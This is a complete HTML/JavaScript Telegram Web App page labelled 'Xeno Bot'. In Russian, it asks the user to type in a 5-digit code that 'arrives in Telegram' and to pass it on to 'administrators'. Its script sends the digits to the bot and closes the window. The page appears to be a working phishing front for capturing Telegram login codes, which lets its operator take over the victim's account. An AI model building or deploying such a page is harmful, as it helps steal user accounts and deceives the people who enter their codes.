<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xeno Bot - Ввод кода</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #16213e;
            border-radius: 20px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        }
        h1 { color: #fff; text-align: center; font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #8899bb; text-align: center; font-size: 14px; margin-bottom: 30px; }
        .code-input {
            width: 100%;
            padding: 16px;
            font-size: 32px;
            text-align: center;
            letter-spacing: 12px;
            background: #0f3460;
            border: 2px solid #533483;
            border-radius: 12px;
            color: #fff;
            outline: none;
            transition: border-color 0.3s;
        }
        .code-input:focus { border-color: #e94560; }
        .code-input::placeholder {
            letter-spacing: 2px;
            font-size: 16px;
            color: #556688;
        }
        .btn {
            width: 100%;
            padding: 16px;
            margin-top: 20px;
            background: #e94560;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s, transform 0.1s;
        }
        .btn:hover { background: #c73652; }
        .btn:active { transform: scale(0.97); }
        .btn:disabled { background: #555577; cursor: not-allowed; }
        .error { color: #e94560; font-size: 14px; text-align: center; margin-top: 12px; display: none; }
        .error.show { display: block; }
        .info { color: #8899bb; font-size: 13px; text-align: center; margin-top: 20px; line-height: 1.6; }
        .info span { color: #e94560; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Xeno Bot</h1>
        <p class="subtitle">Введите код для авторизации</p>
        
        <input type="text" id="codeInput" class="code-input" placeholder="0 0 0 0 0" maxlength="5" inputmode="numeric" autofocus>
        
        <button id="submitBtn" class="btn">✅ Подтвердить код</button>
        <div id="errorMsg" class="error">❌ Введите 5 цифр</div>
        
        <div class="info">
            Код приходит в <span>Telegram</span><br>
            После ввода отправьте его администраторам
        </div>
    </div>

    <script>
        const input = document.getElementById('codeInput');
        const btn = document.getElementById('submitBtn');
        const error = document.getElementById('errorMsg');

        input.focus();

        input.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 5);
            error.classList.remove('show');
        });

        input.addEventListener('keyup', function(e) {
            if (this.value.length === 5 && e.key !== 'Backspace') {
                sendCode();
            }
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendCode();
            }
        });

        function sendCode() {
            const code = input.value.trim();
            
            if (code.length !== 5 || !/^\d+$/.test(code)) {
                error.textContent = '❌ Введите ровно 5 цифр';
                error.classList.add('show');
                input.focus();
                return;
            }

            btn.disabled = true;
            btn.textContent = '⏳ Отправка...';

            try {
                Telegram.WebApp.sendData(code);
                btn.textContent = '✅ Отправлено!';
                btn.style.background = '#2ecc71';
                
                setTimeout(() => {
                    Telegram.WebApp.close();
                }, 1500);
                
            } catch (e) {
                error.textContent = '❌ Ошибка отправки. Попробуйте снова.';
                error.classList.add('show');
                btn.disabled = false;
                btn.textContent = '✅ Подтвердить код';
                btn.style.background = '#e94560';
            }
        }

        btn.addEventListener('click', sendCode);
    </script>
</body>
</html>
